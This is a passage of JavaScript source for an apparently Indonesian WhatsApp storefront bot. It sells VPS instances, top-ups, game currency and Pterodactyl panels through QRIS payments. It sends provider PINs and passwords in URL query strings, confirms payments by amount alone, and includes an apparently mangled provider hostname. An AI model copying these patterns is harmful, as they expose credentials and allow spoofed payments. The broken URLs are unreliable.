`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await ArroganzzReply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await XPanz.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        ArroganzzReply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "topupsaldo": {
if (m.isGroup) return ArroganzzReply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return ArroganzzReply(example("085XXX"))
if (!args[0].startsWith("08")) return ArroganzzReply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okeXPanzect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Top Up Saldo GO-JEK/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupsaldo ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Nominal Topup Saldo',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Saldo\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "Skyzopedia" + `${Date.now()}`
await fetchJson(`https://h2h.okeXPanzect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeXPanzect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "topupdiamond": {
if (m.isGroup) return ArroganzzReply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0] || !args[0].split("|")) return ArroganzzReply(example("id|serverid"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].split("|")[0]
let serverid = args[0].split("|")[1]
const { data } = await axios.get("https://www.okeXPanzect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /TPG Diamond Mobile Legends/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /TPG Diamond Free Fire/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /TPG Game Mobile PUBG/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /TPG Stumble Guys/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupdiamond ${nodana}|${serverid} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Topup Diamond',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Diamond\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.id = args[0].split("|")[0]
Obj.serverid = args[0].split("|")[1]
Obj.nodana = Obj.id + Obj.serverid
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "Skyzopedia" + `${Date.now()}`
await fetchJson(`https://h2h.okeXPanzect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeXPanzect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "isipulsa": {
if (m.isGroup) return ArroganzzReply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return ArroganzzReply(example("085XXX"))
if (!args[0].startsWith("08")) return ArroganzzReply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okeXPanzect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Axis Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana0 = data.filter(item => /Telkomsel Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Smartfren Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /Three Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /XL Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);   
 dana = [...dana, ...dana0, ...dana1, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.isipulsa ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Isi Pulsa',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Nominal Isi Pulsa\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "Skyzopedia" + `${Date.now()}`
await fetchJson(`https://h2h.okeXPanzect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeXPanzect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buypanel": {
if (m.isGroup) return ArroganzzReply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return ArroganzzReply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ArroganzzReply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ArroganzzReply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await XPanz.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return ArroganzzReply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
